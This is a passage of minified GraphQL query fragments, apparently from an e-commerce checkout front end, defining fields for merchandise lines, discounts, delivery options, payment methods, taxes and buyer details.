__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode 